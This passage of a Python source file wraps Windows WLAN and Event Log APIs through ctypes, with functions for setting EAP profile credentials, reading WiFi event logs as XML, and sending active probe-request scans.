    WlanCloseHandle(handle)

def wlanSetProfileEapXmlUserData(guid, strProfileName, strEapXmlUserData):
    """
        Sets EAP credentials for profile "strProfileName" 

        **Arguments:**
        
        - guid: GUID of interface (String)
        - strProfileName: Name of the profile (String)
        - strEapXmlUserData: EAP credentials in XML format (String)
    """
    handle = WlanOpenHandle()
    WlanSetProfileEapXmlUserData(handle, guid, strProfileName, strEapXmlUserData)
    WlanCloseHandle(handle)

def getEventXML(hEvent):
    """
        Returns the event in XML string format.
        
        **Arguments:**
        
        - hEvent: Event handlers (EVT_HANDLE)
    """
    hEvent = EVT_HANDLE(hEvent)
    bufferSize = c_ulong(0);
    bufferUsed = c_ulong(0);
    propertyCount = c_ulong(0);
    renderedContent = None;
    if EvtRender(hEvent, bufferSize, renderedContent, bufferUsed, propertyCount) == False:
        #print "Buffer used   = %s" %bufferUsed
        bufferSize = bufferUsed
        #arrayType = c_void_p * bufferSize.value
        #renderedContent = arrayType()
        renderedContent = "x" * bufferSize.value
        EvtRender(hEvent, bufferSize, renderedContent, bufferUsed, propertyCount)
    
    # TODO: Find out why even places of string are filled with garbage characters and fix this
    finalString = ""
    count = 1
    for each in list(renderedContent):
        if count % 2 != 0:
            #print(each)
            finalString = finalString + each
            count+=1
        else:
            count+=1
    #print finalString
    # Removing a garbage character from the end
    finalString = finalString[:-1]
    return finalString
    
    
def getEventLogs(eventType):
    """
        Get event logs for WiFi sub system 
    
        **Arguments:**
        
        - eventType: Type of events (String)
        
            - 8000
            - 8001
            - 8003
            - 8012
            - 11000
            - 11001
            - 11004
            - 11005
            - 11010
            - all
    """
    # TODO: Handle all event types. 9 handled till now.
    if eventType == "all":
        query = None
    else:
        query = "Event/System[EventID="+eventType+"]"
    
    # Getting result sets for query
    evtResults = EvtQuery(query)
    evtResults = EVT_HANDLE(evtResults)

    array_type = EVT_HANDLE * ARRAY_SIZE
    hEvents = array_type()
    returned = c_ulong(0)
    INFINITE = 0xFFFFFFFF
    phEvents = pointer(hEvents)
    #print type(hEvents)
    
    eventListXML = []
    while True:
        if EvtNext(evtResults, ARRAY_SIZE, phEvents, INFINITE, returned) == False:
            break
        #print "value of returned =  %s" %returned
     
        value = returned.value
        for i in range (0, value):
            eventListXML.append(getEventXML(hEvents[i]))
            EvtClose(hEvents[i])
    return eventListXML


def wlanScan(guid, ssid="", ElementId = 12, data=""):
    """
        Send out probe requests i.e. active scanning.
        
        **Arguments:**
        
        - guid: GUID of the Interface (String) 
        - ssid: Profile/SSID name to be filled in for probe requests (String)
        - ElementId: Information Element ID to be used for packing (Integer)  
        - data: Data to be sent over channel (String)
    """

    sizeFixed = 16  # 8 bit for IE tag and 8 bit for tag size
    informationElementId = ElementId
    handle = WlanOpenHandle()
    if data != "":
        arrayType = c_byte * 20
        array = arrayType()
        array[0] = c_byte(informationElementId)
        array[1] = c_byte(len(data))
        for i in range (2, len(data)+2):
            tempVar = ord(data[i-2])
            #print "char = %s    int=%s" %(data[i-2],tempVar) 
            array[i] = c_byte(tempVar)
        dataStruct = WLAN_RAW_DATA(sizeFixed, array)
        result = WlanScan(handle, guid, ssid, dataStruct)
    else:
        result = WlanScan(handle, guid, ssid)
    WlanCloseHandle(handle)
    return result